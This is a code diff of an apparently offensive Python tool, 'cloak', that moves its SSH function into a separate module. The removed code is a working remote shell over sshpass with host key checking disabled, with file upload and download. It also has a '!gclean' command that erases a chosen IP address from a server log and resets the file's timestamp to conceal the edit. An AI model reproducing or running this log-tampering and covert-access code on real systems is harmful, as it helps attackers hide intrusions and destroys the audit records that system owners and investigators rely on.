@@ -4,6 +4,7 @@ import ipaddress
 import subprocess
 import pexpect #Required for fake SSH shell to keep one session open
 import time
+from ssh_module import ssh
 from rich.console import Console
 from rich.table import Table
 from rich.text import Text
@@ -118,7 +119,7 @@ def connect():
         case "SFTP":
             sftp()
         case "SSH":
-            ssh()
+            ssh(target_ip, target_port, credential_username, credential_type, credential_value)
         case "WINRM":
             winrm()
         case "SMB":
@@ -154,128 +155,6 @@ def shell_prompt():
 
     except Exception as e:
         console.print(f"[red]SSH shell failed:[/red] {e}")
-
-def ssh():
-    import time
-    import getpass
-    import tempfile
-
-    global credential_username, credential_type, credential_value
-    username = credential_username
-    cred_type = credential_type
-    cred_value = credential_value
-
-    if not all([target_ip, target_port, credential_type, credential_value]):
-        console.print("[red]Missing required configuration or credential. Use 'show' to verify.[/red]")
-        return
-
-
-    if cred_type != "password":
-        console.print(f"[red]SSH only supports password-based SSH in this function (got: {cred_type})[/red]")
-        return
-
-    socket_dir = os.path.join(tempfile.gettempdir(), f"cloak-{getpass.getuser()}")
-    os.makedirs(socket_dir, mode=0o700, exist_ok=True)
-    socket_path = os.path.join(socket_dir, "ssh.sock")
-
-    console.print(f"[bold green]Starting SSH session to {username}@{target_ip}:{target_port}...[/bold green]")
-
-    try:
-        subprocess.run([
-            "sshpass", "-p", cred_value,
-            "ssh", "-M", "-S", socket_path, "-fnNT",
-            "-o", "StrictHostKeyChecking=no",
-            "-o", "UserKnownHostsFile=/dev/null",
-            "-o", "PreferredAuthentications=password",
-            "-o", "PubkeyAuthentication=no",
-            f"{username}@{target_ip}", "-p", str(target_port)
-        ], check=True)
-
-        while True:
-            cmd = input("shell > ").strip()
-            if cmd in ["exit", "quit"]:
-                break
-
-            elif cmd.startswith("!get "):
-                path = cmd.split(" ", 1)[1]
-                console.print(f"Downloading {path}...")
-                try:
-                    sftp_cmd = f"get {path}"
-                    subprocess.run([
-                        "sshpass", "-p", cred_value,
-                        "sftp", "-o", f"ControlPath={socket_path}",
-                        "-o", "StrictHostKeyChecking=no",
-                        "-o", "UserKnownHostsFile=/dev/null",
-                        f"{username}@{target_ip}"
-                    ], input=sftp_cmd.encode(), check=True)
-                except subprocess.CalledProcessError as e:
-                    console.print(f"[red]Download failed:[/red] {e}")
-
-            elif cmd.startswith("!put"):
-                parts = cmd.split()
-                if len(parts) == 2:
-                    src, dst = parts[1], "~"
-                elif len(parts) == 3:
-                    src, dst = parts[1], parts[2]
-                else:
-                    console.print("[red]Usage: !put <local_file> [remote_path][/red]")
-                    continue
-                console.print(f"Uploading {src} to {dst}...")
-                try:
-                    sftp_cmd = f"put {src} {dst}"
-                    subprocess.run([
-                        "sshpass", "-p", cred_value,
-                        "sftp", "-o", f"ControlPath={socket_path}",
-                        "-o", "StrictHostKeyChecking=no",
-                        "-o", "UserKnownHostsFile=/dev/null",
-                        f"{username}@{target_ip}"
-                    ], input=sftp_cmd.encode(), check=True)
-                except subprocess.CalledProcessError as e:
-                    console.print(f"[red]Upload failed:[/red] {e}")
-
-            elif cmd.startswith("!gclean"):
-                parts = cmd.split()
-                if len(parts) != 3:
-                    console.print("[red]Usage: !gclean <log_path> <ip>[/red]")
-                    continue
-                log_path, ip_to_clean = parts[1], parts[2]
-
-                remote_script = f"""
-cp {log_path} /tmp/.cloaklog.bak && \
-grep -vi '{ip_to_clean}' /tmp/.cloaklog.bak > /tmp/.cloaklog.clean && \
-if ! grep -q '{ip_to_clean}' /tmp/.cloaklog.clean; then \
-    cp /tmp/.cloaklog.clean {log_path} && \
-    echo '[+] Overwritten {log_path} with cleaned log.'; \
-    diff /tmp/.cloaklog.clean {log_path}; \
-    ts=$(tail -n 1 {log_path} | awk '{{print $1, $2, $3}}'); \
-    if [ ! -z "$ts" ]; then \
-        touch -md "$ts" {log_path}; \
-        echo '[+] Timestamp adjusted to last entry: ' "$ts"; \
-    fi; \
-else \
-    echo '[-] IP still present. Aborting overwrite.'; \
-fi
-"""
-                subprocess.run([
-                    "sshpass", "-p", cred_value,
-                    "ssh", "-S", socket_path,
-                    "-o", "StrictHostKeyChecking=no",
-                    "-o", "UserKnownHostsFile=/dev/null",
-                    f"{username}@{target_ip}", "-p", str(target_port),
-                    remote_script
-                ])
-            else:
-                subprocess.run([
-                    "sshpass", "-p", cred_value,
-                    "ssh", "-S", socket_path,
-                    "-o", "StrictHostKeyChecking=no",
-                    "-o", "UserKnownHostsFile=/dev/null",
-                    f"{username}@{target_ip}", "-p", str(target_port),
-                    cmd
-                ])
-    finally:
-        subprocess.run(["ssh", "-S", socket_path, "-O", "exit", f"{username}@{target_ip}"])
-
 
 def sftp():
     if not all([target_ip, target_port, credentials]):
